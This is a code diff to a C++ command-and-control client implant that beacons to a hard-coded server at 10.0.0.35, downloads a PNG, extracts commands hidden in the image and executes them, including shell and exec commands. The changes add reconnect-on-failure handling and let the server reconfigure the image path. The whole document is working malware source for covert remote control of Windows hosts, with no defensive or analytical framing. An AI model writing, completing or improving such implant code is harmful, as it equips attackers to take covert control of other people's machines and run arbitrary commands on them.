@@ -1,7 +1,6 @@
 // C2client.cpp : This file contains the 'main' function. Program execution begins and ends there.
 //
 #include "client.h"
-//Header for Image Decoding
 #include <wincodec.h>
 #include <wincodecsdk.h>
 #pragma comment(lib, "WindowsCodecs.lib")
@@ -28,20 +27,20 @@ enum TYPE {
 	SHELL,//3-0
 	EXEC, //4-COMMAND
 };
+
 //Global Variables
 bool COInit = FALSE;				//COInit can only be initialized once
 std::string ID = "ASAFW";
 unsigned long int beaconTime = 0;	//How often client beacans out to server
 std::string hostname = "10.0.0.35";
 std::string port = "8080";
-std::string path = "/images/testing.png";
+std::string path = "/images/default.png";
 
 int main()
 {	
 	std::string commands;					//String to hold commands (Used to grab all encoded commands from image)
 	std::vector<std::string> commandList;	//Vector to store each individual command
 	HRESULT HR;								//Error handler for COM Objects
-	
 	/*Initialize Client*/
 	//Initialize the COM library for use by the calling thread. This function must be called, and can only be called once from the same thread. 
 	//pvReserved is reserved and must be NULL, COINT value is Apartment Threaded(Single Threaded COM Thread)
@@ -58,11 +57,17 @@ int main()
 		//Sleep (Initial sleep is 0
 		Sleep(beaconTime);
 		//Connect to server
-		clientC.clientConn(&clientC,hostname, port);
+		if (clientC.clientConn(&clientC, hostname, port)) {
+			continue;
+		}
 		//Send Get Request to C2
-		clientC.sendRequest(&clientC,"GET /images/testing.png HTTP/1.1");
+		if (clientC.sendRequest(&clientC, "GET " + path +  " HTTP/1.1")) {
+			continue;
+		}
 		//Recieve respone
-		clientC.recvResponse(&clientC);
+		if (clientC.recvResponse(&clientC)) {
+			continue;
+		}
 		//Decode the image and get the commands
 		if ((HR = getCommands(&commands)) != S_OK) {
 			OutputDebugStringA("Server: Unable to grab encoded commands\n");
@@ -167,7 +172,6 @@ HRESULT getCommands(std::string *commands ) {
 	return hr;
 
 }//CComPtr auto releases underlying IErrorInfo interface
-
 //Parse Command Header for all commands in the encoded message;
 size_t parseCommands(std::vector<std::string>* commandList, std::string commandHeader) {
 	int currentPos = 0;	//Tail
@@ -224,6 +228,9 @@ size_t executeCommands(std::vector<std::string>* list) {
 				varValue = value.substr(value.find_first_of('-') + 1, value.length());
 				if (varName == "hostname") {
 					hostname = varValue;
+				}
+				if (varName == "path") {
+					path = varValue;
 				}
 				else if (varName == "beacon") {
 					beaconTime = atoi(varValue.c_str());
